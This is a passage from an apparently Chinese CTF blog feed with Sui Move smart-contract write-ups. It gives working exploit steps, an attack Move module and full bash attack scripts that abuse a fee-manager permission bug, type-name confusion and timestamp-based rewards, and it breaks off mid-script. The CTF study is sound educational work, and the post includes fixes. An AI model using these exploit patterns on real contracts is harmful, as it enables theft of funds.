id="攻击实施"><a href="#攻击实施" class="headerlink" title="攻击实施"></a>攻击实施</h2><h3 id="步骤1-利用权限漏洞"><a href="#步骤1-利用权限漏洞" class="headerlink" title="步骤1: 利用权限漏洞"></a>步骤1: 利用权限漏洞</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token parameter variable">--package</span> 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a <span class="token punctuation">\</span>  <span class="token parameter variable">--module</span> pool <span class="token parameter variable">--function</span> set_fee_manager <span class="token punctuation">\</span>  <span class="token parameter variable">--args</span> 0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 <span class="token punctuation">\</span>         0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe <span class="token punctuation">\</span>  --gas-budget <span class="token number">10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结果</strong>: 成功成为fee_manager</p><h3 id="步骤2-部署攻击合约"><a href="#步骤2-部署攻击合约" class="headerlink" title="步骤2: 部署攻击合约"></a>步骤2: 部署攻击合约</h3><p>创建包含假TOKEN结构体的攻击合约：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">module <span class="token namespace">exploit<span class="token punctuation">::</span></span>attack <span class="token punctuation">&#123;</span>    <span class="token comment">// 创建假的TOKEN结构体，名称与原始代币相同</span>    public <span class="token keyword">struct</span> <span class="token type-definition class-name">TOKEN1</span> has drop <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    public <span class="token keyword">struct</span> <span class="token type-definition class-name">TOKEN2</span> has drop <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>      public <span class="token keyword">struct</span> <span class="token type-definition class-name">TOKEN3</span> has drop <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    public <span class="token keyword">struct</span> <span class="token type-definition class-name">TOKEN4</span> has drop <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    fun <span class="token function">init</span><span class="token punctuation">(</span>_ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 空的初始化函数</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>部署结果</strong>:</p><ul><li>攻击合约Package ID: <code>0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07</code></li></ul><h3 id="步骤3-创建假池子"><a href="#步骤3-创建假池子" class="headerlink" title="步骤3: 创建假池子"></a>步骤3: 创建假池子</h3><p>使用PTB (Programmable Transaction Block) 创建空的池子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建TOKEN1-TOKEN2池子</span>sui client ptb <span class="token punctuation">\</span>  --move-call 0x2::coin::zero <span class="token string">"&lt;0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN1>"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--assign</span> token1 <span class="token punctuation">\</span>  --move-call 0x2::coin::zero <span class="token string">"&lt;0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN2>"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--assign</span> token2 <span class="token punctuation">\</span>  --move-call 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a::pool::create_pool <span class="token punctuation">\</span>    <span class="token string">"&lt;0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN1,0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN2>"</span> <span class="token punctuation">\</span>    @0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 <span class="token number">0</span> token1 token2 <span class="token punctuation">\</span>  <span class="token parameter variable">--assign</span> pool_cap1 <span class="token punctuation">\</span>  --transfer-objects <span class="token string">"[pool_cap1]"</span> @0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe <span class="token punctuation">\</span>  --gas-budget <span class="token number">20000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结果</strong>: 成功创建TOKEN1-TOKEN2池子，获得PoolCap</p><p>类似地创建TOKEN3-TOKEN4池子。</p><h3 id="步骤4-触发Flag"><a href="#步骤4-触发Flag" class="headerlink" title="步骤4: 触发Flag"></a>步骤4: 触发Flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token parameter variable">--package</span> 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a <span class="token punctuation">\</span>  <span class="token parameter variable">--module</span> pool <span class="token parameter variable">--function</span> is_solved <span class="token punctuation">\</span>  <span class="token parameter variable">--args</span> 0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 <span class="token punctuation">\</span>  --gas-budget <span class="token number">20000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结果</strong>: <strong>攻击成功！</strong></p><h2 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h2><p><strong>成功交易哈希</strong>: <code>JYBCFLXdhzw1kNus4fVRwdvwYVrVQ29HP5Ut1xLXsQG</code></p><p>在交易事件中可以看到Flag事件：</p><pre class="line-numbers language-none"><code class="language-none">EventType: 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a::pool::FlagParsedJSON:  ┌──────┬────────────────────────────────────────────────────────────────────┐  │ user │ 0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe │  └──────┴────────────────────────────────────────────────────────────────────┘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="技术要点"><a href="#技术要点" class="headerlink" title="技术要点"></a>技术要点</h2><h3 id="1-PTB语法的正确使用"><a href="#1-PTB语法的正确使用" class="headerlink" title="1. PTB语法的正确使用"></a>1. PTB语法的正确使用</h3><ul><li>使用<code>--assign</code>来创建变量引用</li><li>正确的对象ID引用格式: <code>@&lt;object_id&gt;</code></li><li>类型参数格式: <code>&quot;&lt;package::module::Type&gt;&quot;</code></li></ul><h3 id="2-假代币结构体的关键作用"><a href="#2-假代币结构体的关键作用" class="headerlink" title="2. 假代币结构体的关键作用"></a>2. 假代币结构体的关键作用</h3><ul><li>利用<code>get_struct</code>函数只检查结构体名称的漏洞</li><li>创建同名但不同包的TOKEN结构体</li><li>绕过类型系统检查</li></ul><h3 id="3-空池子的巧妙利用"><a href="#3-空池子的巧妙利用" class="headerlink" title="3. 空池子的巧妙利用"></a>3. 空池子的巧妙利用</h3><ul><li>创建零余额的池子</li><li>使所有<code>get_balance</code>和<code>get_total_fee</code>调用返回0</li><li>满足<code>sum + fee_sum == 0</code>的条件</li></ul><h2 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h2><ol><li><p><strong>修复权限检查</strong>:</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span> <span class="token operator">==</span> pools<span class="token punctuation">.</span>fee_manager<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>使用完整类型路径</strong>:</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">fun get_struct<span class="token operator">&lt;</span><span class="token class-name">X</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name">String</span> <span class="token punctuation">&#123;</span>    <span class="token namespace">type_name<span class="token punctuation">::</span></span>get<span class="token operator">&lt;</span><span class="token class-name">X</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">into_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// 使用完整类型路径</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>增强is_solved检查</strong>:</p><ul><li>检查池子是否已正确初始化</li><li>验证代币类型的合法性</li><li>添加额外的安全检查</li></ul></li></ol><h2 id="完整攻击脚本"><a href="#完整攻击脚本" class="headerlink" title="完整攻击脚本"></a>完整攻击脚本</h2><p>为了方便复现，这里提供完整的攻击脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># 完整的CTF攻击脚本</span><span class="token assign-left variable">ATTACK_PACKAGE</span><span class="token operator">=</span><span class="token string">"0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07"</span><span class="token assign-left variable">TARGET_PACKAGE</span><span class="token operator">=</span><span class="token string">"0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a"</span><span class="token assign-left variable">POOLS_ID</span><span class="token operator">=</span><span class="token string">"0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001"</span><span class="token assign-left variable">MY_ADDRESS</span><span class="token operator">=</span><span class="token string">"0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe"</span><span class="token builtin class-name">echo</span> <span class="token string">"Step 1: 利用权限漏洞成为fee_manager"</span>sui client call <span class="token parameter variable">--package</span> <span class="token variable">$TARGET_PACKAGE</span> <span class="token parameter variable">--module</span> pool <span class="token parameter variable">--function</span> set_fee_manager <span class="token punctuation">\</span>  <span class="token parameter variable">--args</span> <span class="token variable">$POOLS_ID</span> <span class="token variable">$MY_ADDRESS</span> --gas-budget <span class="token number">10000000</span><span class="token builtin class-name">echo</span> <span class="token string">"Step 2: 创建假TOKEN1-TOKEN2池子"</span>sui client ptb <span class="token punctuation">\</span>  --move-call 0x2::coin::zero <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN1>"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--assign</span> token1 <span class="token punctuation">\</span>  --move-call 0x2::coin::zero <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN2>"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--assign</span> token2 <span class="token punctuation">\</span>  --move-call <span class="token variable">$&#123;TARGET_PACKAGE&#125;</span>::pool::create_pool <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN1,<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN2>"</span> @<span class="token variable">$&#123;POOLS_ID&#125;</span> <span class="token number">0</span> token1 token2 <span class="token punctuation">\</span>  <span class="token parameter variable">--assign</span> pool_cap1 <span class="token punctuation">\</span>  --transfer-objects <span class="token string">"[pool_cap1]"</span> @<span class="token variable">$&#123;MY_ADDRESS&#125;</span> <span class="token punctuation">\</span>  --gas-budget <span class="token number">20000000</span><span class="token builtin class-name">echo</span> <span class="token string">"Step 3: 创建假TOKEN3-TOKEN4池子"</span>sui client ptb <span class="token punctuation">\</span>  --move-call 0x2::coin::zero <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN3>"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--assign</span> token3 <span class="token punctuation">\</span>  --move-call 0x2::coin::zero <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN4>"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--assign</span> token4 <span class="token punctuation">\</span>  --move-call <span class="token variable">$&#123;TARGET_PACKAGE&#125;</span>::pool::create_pool <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN3,<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN4>"</span> @<span class="token variable">$&#123;POOLS_ID&#125;</span> <span class="token number">0</span> token3 token4 <span class="token punctuation">\</span>  <span class="token parameter variable">--assign</span> pool_cap2 <span class="token punctuation">\</span>  --transfer-objects <span class="token string">"[pool_cap2]"</span> @<span class="token variable">$&#123;MY_ADDRESS&#125;</span> <span class="token punctuation">\</span>  --gas-budget <span class="token number">20000000</span><span class="token builtin class-name">echo</span> <span class="token string">"Step 4: 触发Flag"</span>sui client call <span class="token parameter variable">--package</span> <span class="token variable">$TARGET_PACKAGE</span> <span class="token parameter variable">--module</span> pool <span class="token parameter variable">--function</span> is_solved <span class="token punctuation">\</span>  <span class="token parameter variable">--args</span> <span class="token variable">$POOLS_ID</span> --gas-budget <span class="token number">20000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="学习要点"><a href="#学习要点" class="headerlink" title="学习要点"></a>学习要点</h2><h3 id="1-Sui-Move类型系统的理解"><a href="#1-Sui-Move类型系统的理解" class="headerlink" title="1. Sui Move类型系统的理解"></a>1. Sui Move类型系统的理解</h3><ul><li>泛型类型参数的使用</li><li>结构体的witness模式</li><li>类型安全的重要性</li></ul><h3 id="2-PTB的强大功能"><a href="#2-PTB的强大功能" class="headerlink" title="2. PTB的强大功能"></a>2. PTB的强大功能</h3><ul><li>可编程交易块允许复杂的操作组合</li><li>正确的语法对攻击成功至关重要</li><li>变量引用和对象传递</li></ul><h3 id="3-动态字段的工作原理"><a href="#3-动态字段的工作原理" class="headerlink" title="3. 动态字段的工作原理"></a>3. 动态字段的工作原理</h3><ul><li>Sui的动态字段存储机制</li><li>键值生成和查找过程</li><li>类型擦除的安全隐患</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次攻击成功利用了Sui Move合约中的多个设计缺陷，特别是权限控制错误和类型系统的不当使用。通过创建假代币结构体和空池子，巧妙地绕过了安全检查，最终获得了Flag。</p><p>关键成功因素：</p><ol><li><strong>深入的代码分析</strong> - 仔细阅读合约代码，发现多个漏洞</li><li><strong>正确的攻击策略</strong> - 将多个漏洞组合使用</li><li><strong>技术实现能力</strong> - 正确使用PTB和Sui CLI</li><li><strong>持续的调试</strong> - 在遇到问题时不断调整方法</li></ol><p>这个案例展示了智能合约安全审计的重要性，特别是在权限管理和类型安全方面需要格外谨慎。对于开发者来说，这提醒我们要：</p><ul><li>仔细检查权限控制逻辑</li><li>使用完整的类型标识符</li><li>进行充分的安全测试</li><li>考虑各种边界情况</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Sui-Move-CTF-Swap-Challenge-Writeup&quot;&gt;&lt;a href=&quot;#Sui-Move-CTF-Swap-Challenge-Writeup&quot; class=&quot;headerlink&quot; title=&quot;Sui Move CTF - Swap Ch</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="Web3" scheme="http://example.com/categories/Web3/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Web3" scheme="http://example.com/tags/Web3/"/>
    
  </entry>
  
  <entry>
    <title>SUI MOVE CTF 2025 (1-4) Write Up</title>
    <link href="http://example.com/2025/08/05/MOVE%20CTF%202025/"/>
    <id>http://example.com/2025/08/05/MOVE%20CTF%202025/</id>
    <published>2025-08-05T08:32:15.725Z</published>
    <updated>2025-08-05T11:35:54.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sui-Move-CTF-2025-1-4-WriteUp"><a href="#Sui-Move-CTF-2025-1-4-WriteUp" class="headerlink" title="Sui Move CTF 2025(1-4) WriteUp"></a>Sui Move CTF 2025(1-4) WriteUp</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>本文档包含了四道Sui Move CTF挑战的完整解题过程，涵盖了智能合约漏洞利用、算法分析、密码学攻击和路径搜索等多个技术领域。每个题目都保留了完整的技术细节、代码实现和解题过程。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol><li><a href="#1-%E5%86%92%E9%99%A9%E6%B8%B8%E6%88%8F">冒险游戏 - 智能合约漏洞利用</a></li><li><a href="#2-%E5%BC%BA%E7%9B%97%E6%B8%B8%E6%88%8F">强盗游戏 - 动态规划算法</a></li><li><a href="#3-%E6%81%A2%E5%A4%8D%E5%AF%86%E9%92%A5">恢复密钥 - 格理论密码学</a></li><li><a href="#4-%E8%BF%B7%E5%AE%AB%E6%B8%B8%E6%88%8F">迷宫游戏 - 路径搜索算法</a></li></ol><hr><h1 id="1-冒险游戏"><a href="#1-冒险游戏" class="headerlink" title="1. 冒险游戏"></a>1. 冒险游戏</h1><h2 id="挑战概述"><a href="#挑战概述" class="headerlink" title="挑战概述"></a>挑战概述</h2><p>这是一个基于Sui Move智能合约的CTF挑战，目标是通过利用合约漏洞获取Flag。挑战涉及一个冒险游戏，玩家需要控制英雄击败怪物来获得token，最终购买宝箱获取Flag。</p><h2 id="合约分析"><a href="#合约分析" class="headerlink" title="合约分析"></a>合约分析</h2><h3 id="核心合约结构"><a href="#核心合约结构" class="headerlink" title="核心合约结构"></a>核心合约结构</h3><p>挑战包含三个主要模块：</p><ul><li><code>adventure.move</code> - 主要游戏逻辑</li><li><code>hero.move</code> - 英雄系统</li><li><code>inventory.move</code> - 物品和Flag系统</li></ul><h3 id="关键漏洞发现"><a href="#关键漏洞发现" class="headerlink" title="关键漏洞发现"></a>关键漏洞发现</h3><h4 id="1-体力消耗漏洞"><a href="#1-体力消耗漏洞" class="headerlink" title="1. 体力消耗漏洞"></a>1. 体力消耗漏洞</h4><p>在 <code>slay_boar_king</code> 函数中发现关键漏洞：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">entry fun <span class="token function">slay_boar_king</span><span class="token punctuation">(</span>clock<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token namespace">clock<span class="token punctuation">::</span></span><span class="token class-name">Clock</span><span class="token punctuation">,</span> usersTokenAmount<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">UsersTokenAmount</span><span class="token punctuation">,</span> hero<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Hero</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ...</span>    <span class="token comment">//hero::decrease_stamina(hero, 2);  // 这行被注释掉了！</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>影响</strong>: 击败野猪王不消耗体力，可以无限次攻击。</p><h4 id="2-时间戳依赖漏洞"><a href="#2-时间戳依赖漏洞" class="headerlink" title="2. 时间戳依赖漏洞"></a>2. 时间戳依赖漏洞</h4><p>token奖励基于时间戳：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> <span class="token punctuation">(</span>fight_result <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> current_timestamp <span class="token operator">=</span> <span class="token namespace">clock<span class="token punctuation">::</span></span><span class="token function">timestamp_ms</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> d100 <span class="token operator">=</span> current_timestamp <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>d100 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 增加5个token</span>        <span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 减少5个token</span>        <span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>影响</strong>: 只有当 <code>timestamp % 3 == 1</code> 时才能获得token奖励。</p><h4 id="3-计费错误漏洞"><a href="#3-计费错误漏洞" class="headerlink" title="3. 计费错误漏洞"></a>3. 计费错误漏洞</h4><p>在 <code>buy_box</code> 函数中：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token operator">*</span>current_balance <span class="token operator">>=</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token constant">ERROR_NO_MONEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 检查200</span><span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">;</span>         <span class="token comment">// 但只扣除100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>影响</strong>: 检查需要200个token但实际只扣除100个。</p><h2 id="攻击策略"><a href="#攻击策略" class="headerlink" title="攻击策略"></a>攻击策略</h2><h3 id="阶段1-英雄战斗力提升"><a href="#阶段1-英雄战斗力提升" class="headerlink" title="阶段1: 英雄战斗力提升"></a>阶段1: 英雄战斗力提升</h3><p>发现英雄初始属性不足以击败野猪王：</p><ul><li>初始strength: 10</li><li>野猪王defense: 10-15</li></ul><p><strong>解决方案</strong>: 升级英雄系统</p><ul><li>击败普通野猪获得经验（每次+10经验）</li><li>100经验可升级，升级后strength增加30点</li></ul><h3 id="阶段2-PTB时间戳攻击"><a href="#阶段2-PTB时间戳攻击" class="headerlink" title="阶段2: PTB时间戳攻击"></a>阶段2: PTB时间戳攻击</h3><p>利用Programmable Transaction Block (PTB)确保所有操作使用相同时间戳：</p><ol><li>等待有利时间戳（<code>timestamp % 3 == 1</code>）</li><li>在单个PTB中执行20次 <code>slay_boar_king</code>调用</li><li>每次成功+5 token，从100增加到200</li></ol><h3 id="阶段3-购买宝箱获取Flag"><a href="#阶段3-购买宝箱获取Flag" class="headerlink" title="阶段3: 购买宝箱获取Flag"></a>阶段3: 购买宝箱获取Flag</h3><ol><li>利用计费错误购买宝箱（检查200但只扣100）</li><li>调用 <code>get_flag</code>函数获取Flag事件</li></ol><h2 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h2><h3 id="英雄升级脚本"><a href="#英雄升级脚本" class="headerlink" title="英雄升级脚本"></a>英雄升级脚本</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 击败30只普通野猪获得经验</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">do</span>    sui client call <span class="token parameter variable">--package</span> <span class="token variable">$PACKAGE_ID</span> <span class="token parameter variable">--module</span> adventure <span class="token parameter variable">--function</span> slay_boar <span class="token punctuation">\</span>        <span class="token parameter variable">--args</span> <span class="token variable">$HERO_ID</span> --gas-budget <span class="token number">20000000</span><span class="token keyword">done</span><span class="token comment"># 升级英雄</span>sui client call <span class="token parameter variable">--package</span> <span class="token variable">$PACKAGE_ID</span> <span class="token parameter variable">--module</span> hero <span class="token parameter variable">--function</span> level_up <span class="token punctuation">\</span>    <span class="token parameter variable">--args</span> <span class="token variable">$HERO_ID</span> --gas-budget <span class="token number">20000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PTB批量攻击脚本"><a href="#PTB批量攻击脚本" class="headerlink" title="PTB批量攻击脚本"></a>PTB批量攻击脚本</h3><p>核心攻击脚本 <code>ptb_batch_attack.sh</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># 合约配置</span><span class="token assign-left variable">PACKAGE_ID</span><span class="token operator">=</span><span class="token string">"0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d"</span><span class="token assign-left variable">HERO_ID</span><span class="token operator">=</span><span class="token string">"0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134"</span><span class="token assign-left variable">USERS_TOKEN_AMOUNT_ID</span><span class="token operator">=</span><span class="token string">"0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45"</span><span class="token assign-left variable">CLOCK_ID</span><span class="token operator">=</span><span class="token string">"0x6"</span><span class="token comment"># PTB攻击函数</span><span class="token function-name function">execute_ptb_attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin class-name">local</span> <span class="token assign-left variable">batch_size</span><span class="token operator">=</span><span class="token variable">$1</span>    <span class="token assign-left variable">PTB_CMD</span><span class="token operator">=</span><span class="token string">"sui client ptb"</span>      <span class="token comment"># 构建20次slay_boar_king调用</span>    <span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>batch_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>        <span class="token assign-left variable">PTB_CMD</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$PTB_CMD</span> --move-call <span class="token variable">$PACKAGE_ID</span>::adventure::slay_boar_king <span class="token entity" title="\&quot;">\"</span><span class="token entity" title="\&quot;">\"</span> @<span class="token variable">$CLOCK_ID</span> @<span class="token variable">$USERS_TOKEN_AMOUNT_ID</span> @<span class="token variable">$HERO_ID</span>"</span>    <span class="token keyword">done</span>      <span class="token assign-left variable">PTB_CMD</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$PTB_CMD</span> --gas-budget 100000000"</span>    <span class="token assign-left variable">RESULT</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">eval</span> $PTB_CMD <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token variable">)</span></span>      <span class="token comment"># 检查Amount事件</span>    <span class="token keyword">if</span> <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$RESULT</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> <span class="token string">"Amount"</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token assign-left variable">AMOUNT</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$RESULT</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-A</span> <span class="token number">5</span> <span class="token string">"Amount"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"amount"</span> <span class="token operator">|</span> <span class="token function">tail</span> <span class="token parameter variable">-1</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'[0-9]\+'</span><span class="token variable">)</span></span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$AMOUNT</span>"</span> <span class="token parameter variable">-ge</span> <span class="token number">200</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token builtin class-name">return</span> <span class="token number">0</span>        <span class="token keyword">fi</span>    <span class="token keyword">fi</span>    <span class="token builtin class-name">return</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token comment"># 主攻击循环</span><span class="token keyword">for</span> <span class="token for-or-select variable">attempt</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">100</span><span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token assign-left variable">TIMESTAMP</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%s<span class="token variable">)</span></span>    <span class="token assign-left variable">REMAINDER</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>TIMESTAMP <span class="token operator">%</span> <span class="token number">3</span><span class="token variable">))</span></span>      <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$REMAINDER</span> <span class="token parameter 